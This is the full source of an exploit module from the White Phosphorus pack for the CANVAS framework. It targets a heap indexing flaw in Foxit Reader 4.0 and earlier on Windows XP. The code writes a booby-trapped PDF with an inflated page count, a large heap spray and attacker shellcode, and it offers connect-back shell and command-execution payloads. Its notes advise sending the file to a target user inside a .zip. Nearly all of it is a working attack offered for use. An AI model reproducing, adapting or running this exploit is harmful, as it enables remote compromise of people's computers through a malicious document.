
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################
#Standard Imports

import sys
if '.' not in sys.path: sys.path.append('.')
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import getopt
import socket
import time
import struct

# CANVAS imports
from exploitutils import *
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from MOSDEF import mosdef
from httpclientside import httpclientside

######################################################################################
NAME='Foxit Reader Invalid Pages Heap Exploit'
DESCRIPTION='Exploits a heap indexing issue in Foxit Reader Versions <=4'
VERSION='1.0'
CHANGELOG="""
"""
######################################################################################
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="http://www.foxitsoftware.com/pdf/reader/"
DOCUMENTATION['VersionsAffected']='3.1, 3.2, 3.3, 4.0'
DOCUMENTATION['Notes']="""
Run the module and send the created file to the target user. The file needs to be opened directly in Foxit Reader, not through a browser, so delivery is probably best via a .zip file"""
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION'] = ["XP"]

DEBUGNOTES="""
"""

NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Foxit Invalid Pages Heap Exploit
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command


Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_foxit_pages/wp_foxit_pages.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return
PORT = 0
targets={
    0 : ["Windows XP", (0x00000000), [WINXP]]    
}
######################################################################################
class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1
    
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.badstring='\0\x09\x20\x0a'
        self.name=NAME
        self.port = PORT
        self.filename='info.pdf'
        self.version=0
        self.autoVersioned = False       
        self.use_universal=True    
        return
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return
    
    def run(self):
        
        self.log('WP> Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        self.makefile(fd)
        #fd.write(filedata,fd)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        
        ret = self.wp_postExploitShellcode()
        if ret:
           return ret        
        
        return 1
        
    def makefile(self,fd):

        filestart ="""
%PDF-1.1

1 0 obj
<<
 /Type /Catalog
 /Pages 2 0 R
>>
endobj

2 0 obj
<<
 /Type /Pages
 /Kids [3 0 R]
 /Count 1073744400
>>
endobj

3 0 obj
<<
 /Type /Page
 /Parent 2 0 R
 /MediaBox [0 0 612 792]
 /Resources 
 << /ProcSet 6 0 R
    /Font << /F1 7 0 R >>
 >>
>>
endobj

4 0 obj
<<
  /Length 1500
>>
stream
"""
        fileend="""endstream
endobj
xref
0 90
0000000000 65535 f
0000000012 00000 n
0000000109 00000 n
0000000165 00000 n
0000000234 00000 n
0000000401 00000 n
0000000505 00000 n
0000000662 00000 n
trailer
<<
 /Size 90
 /Root 1 0 R
  /ID 4 0 R
>>
startxref
2000
%%EOF
"""        
        fd.write(filestart)
        
        # Nopslide
        fileslide = "\x05\x05\x05\x05" * 2500 # 10000 bytes
        loop=0
        while (loop < 6000):   #11000 is good
            fd.write(fileslide)
            loop +=1
            
        shellcode = wp_randomnops(4) + self.shellcode
        fd.write(shellcode)
        
        fd.write(fileend)
        
                
        return 

if __name__=='__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
